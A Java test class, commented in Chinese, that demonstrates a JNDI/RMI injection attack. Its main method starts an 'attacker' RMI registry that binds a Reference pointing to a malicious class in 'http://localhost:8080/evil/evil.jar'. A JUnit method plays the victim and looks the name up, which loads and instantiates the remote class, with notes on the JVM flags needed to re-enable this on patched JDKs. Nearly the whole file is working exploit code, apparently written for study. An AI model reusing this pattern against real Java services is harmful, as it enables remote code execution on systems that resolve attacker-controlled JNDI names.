import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.junit.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Hashtable;

/**
 * RMI 攻击服务器
 *
 * @author cuiswing
 * @date 2019-07-17
 */
public class RMIHackerTest {

    /**
     * 攻击者的RMI服务器：localhost:1099
     * 攻击者提供恶意class的服务器：localhost:8080,其中有个evil.jar的资源文件：http://localhost:8080/evil/evil.jar
     */
    public static void main(String[] args) throws Exception {
        int port = 1099;
        // 本地主机上的远程对象注册表Registry的实例,默认端口1099
        Registry registry = LocateRegistry.createRegistry(port);

        // 提供恶意构造对象class的服务器
        String remote_class_server = "http://localhost:8080/evil/evil.jar";
        Reference reference = new Reference("com.cui.code.test.model.EvilUser", "com.cui.code.test.model.EvilUser", remote_class_server);
        //reference的factory class参数指向了一个外部Web服务的地址
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("EvilRequest", referenceWrapper);

        System.out.println("======= hacker:启动RMI服务成功! =======");
    }

    /**
     * 模拟被攻击者的服务器：即JNDI client
     * 需要修改参数，因为JDK逐渐修复了很多漏洞，都没法利用了
     * -Dcom.sun.jndi.rmi.object.trustURLCodebase=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
     * <p>
     * 主要是调用了方法，该方法加载远程URL的class文件并实例化：javax.naming.spi.NamingManager#getObjectInstance(java.lang.Object, javax.naming.Name, javax.naming.Context, java.util.Hashtable)
     * getObjectFactoryFromReference
     *
     * @throws NamingException
     */
    @Test
    public void testJndiClient() throws NamingException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099/");
        Context ctx = new InitialContext(env);
        Object local_obj = ctx.lookup("rmi://127.0.0.1:1099/EvilRequest");
        System.out.println(local_obj);
    }
}
